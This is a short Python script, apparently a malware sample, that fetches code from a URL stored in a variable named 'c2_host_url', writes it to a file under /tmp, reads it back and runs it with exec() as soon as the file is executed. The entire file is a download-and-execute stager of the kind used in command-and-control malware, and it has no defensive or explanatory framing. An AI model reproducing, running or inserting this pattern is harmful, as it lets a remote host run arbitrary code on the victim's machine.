import requests
import os

def fetch_code(url):
    response = requests.get(url)
    return response.text

def store_code_to_file(file_path, code):
    with open(file_path, "w") as f:
        f.write(code)

def read_code(file_path):
    with open(file_path, "r") as f:
        return f.read()

def execute_script(script):
    exec(script)

def main():
    c2_host_url = "https://firefox.com/tmp.py"
    tmp_file = "/tmp/tmp88.py"
    
    code = fetch_code(c2_host_url)
    store_code_to_file(tmp_file, code)
    script = read_code(tmp_file)
    execute_script(script)

main()
